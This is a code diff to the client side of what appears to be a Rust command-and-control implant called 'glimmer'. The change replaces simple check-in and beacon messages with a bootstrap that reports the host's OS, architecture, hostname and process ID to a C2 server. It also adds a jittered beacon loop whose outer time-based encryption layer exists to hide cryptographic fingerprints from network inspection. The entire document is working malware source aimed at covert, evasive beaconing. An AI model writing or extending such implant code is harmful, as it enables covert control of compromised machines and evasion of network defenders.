@@ -1,7 +1,7 @@
 use glimmer::c2::http::HTTPChannel;
 use glimmer::c2::{Channel, SendContext};
 use glimmer::cfg::Config;
-use glimmer::crypto;
+use glimmer::crypto::{self, TimeBasedKey};
 use glimmer::identity;
 use glimmer::proto::{CheckinData, Envelope, MsgType};
 
@@ -39,43 +39,37 @@ fn main() {
         channel.info().max_payload
     );
 
-    // Checkin — ephemeral encryption, request response
+    // Phase 1: Bootstrap with full ephemeral ECDH
     let checkin = CheckinData {
         os: std::env::consts::OS.into(),
         arch: std::env::consts::ARCH.into(),
         host: hostname(),
         pid: std::process::id(),
-        pub_key: vec![], // no longer needed — each message has its own ephemeral key
+        pub_key: vec![],
     };
 
-    match send_with_response(
-        MsgType::Checkin,
-        &node_id,
-        Some(&checkin),
-        &server_pub,
-        &channel,
-    ) {
-        Ok(Some(_response)) => {
-            glimmer::dbg_log!("checkin sent, response: {} bytes", _response.len());
-        }
-        Ok(None) => {
-            eprintln!("[dev] checkin sent, no response");
+    let time_key = match bootstrap(&node_id, &checkin, &server_pub, &channel) {
+        Ok(tk) => {
+            eprintln!("[dev] bootstrap complete, time-based key established");
+            tk
         }
         Err(e) => {
-            eprintln!("[dev] checkin failed: {}", e);
+            eprintln!("[dev] bootstrap failed: {}", e);
+            std::process::exit(1);
         }
-    }
+    };
 
-    // Beacon loop — ephemeral encryption, no response needed
+    // Phase 2: Layered encryption - time-based outer, ECIES inner
     loop {
-        match send_no_response(
+        match send_layered(
             MsgType::Beacon,
             &node_id,
             None::<&()>,
+            &time_key,
             &server_pub,
             &channel,
         ) {
-            Ok(_) => eprintln!("[dev] beacon sent"),
+            Ok(_) => eprintln!("[dev] beacon sent [layered]"),
             Err(e) => eprintln!("[dev] beacon failed: {}", e),
         }
 
@@ -83,36 +77,35 @@ fn main() {
     }
 }
 
-/// Send a message with per-message ephemeral encryption.
-/// No persistent keys — one-time key exists only during this call.
-fn send_no_response<T: serde::Serialize>(
-    msg_type: MsgType,
+/// Phase 1: Bootstrap checkin with full ephemeral ECDH.
+/// Establishes the time-based root secret for the outer encryption layer.
+fn bootstrap(
     node_id: &str,
-    payload: Option<&T>,
+    checkin: &CheckinData,
     server_pub: &[u8],
     channel: &dyn Channel,
-) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
-    let envelope = match payload {
-        Some(data) => Envelope::with_data(msg_type, node_id, data)?,
-        None => Envelope::new(msg_type, node_id, None),
-    };
-
+) -> Result<TimeBasedKey, Box<dyn std::error::Error>> {
+    let envelope = Envelope::with_data(MsgType::Checkin, node_id, checkin)?;
     let serialized = envelope.marshal()?;
 
-    // Per-message ephemeral encryption — key exists only for this call
-    let encrypted = crypto::encrypt_for_server(&serialized, server_pub)?;
+    let (encrypted, _response_kp, root_secret) =
+        crypto::bootstrap_encrypt(&serialized, server_pub)?;
 
     let ctx = SendContext::new(server_pub, node_id, encrypted);
-    channel.send(&ctx)
+    let _response = channel.send(&ctx)?;
+
+    // 300 second time buckets
+    Ok(TimeBasedKey::new(root_secret, 300))
 }
 
-/// Send a message and decrypt the response.
-/// Two ephemeral keypairs: one for sending (consumed immediately),
-/// one for response (consumed when response is decrypted).
-fn send_with_response<T: serde::Serialize>(
+/// Phase 2: Layered encryption.
+/// Inner: ECIES with per-message ephemeral key - only server can decrypt.
+/// Outer: Time-based key - hides the EC fingerprint on the wire.
+fn send_layered<T: serde::Serialize>(
     msg_type: MsgType,
     node_id: &str,
     payload: Option<&T>,
+    time_key: &TimeBasedKey,
     server_pub: &[u8],
     channel: &dyn Channel,
 ) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
@@ -123,23 +116,14 @@ fn send_with_response<T: serde::Serialize>(
 
     let serialized = envelope.marshal()?;
 
-    let (encrypted, response_kp) =
-        crypto::encrypt_for_server_with_response(&serialized, server_pub)?;
+    // Inner layer: per-message ephemeral ECDH, only server can decrypt
+    let inner = crypto::encrypt_for_server(&serialized, server_pub)?;
 
-    let ctx = SendContext::new(server_pub, node_id, encrypted);
-    let response = channel.send(&ctx)?;
+    // Outer layer: time-based, zero fingerprint on wire
+    let outer = time_key.encrypt(&inner)?;
 
-    match response {
-        Some(resp_bytes) if !resp_bytes.is_empty() => {
-            let decrypted = response_kp.decrypt_response(&resp_bytes, server_pub)?;
-            Ok(Some(decrypted))
-        }
-        _ => {
-            // response_kp drops here — private key zeroized even if unused
-            drop(response_kp);
-            Ok(None)
-        }
-    }
+    let ctx = SendContext::new(server_pub, node_id, outer);
+    channel.send(&ctx)
 }
 
 fn sleep(base: std::time::Duration, jitter: f64) {
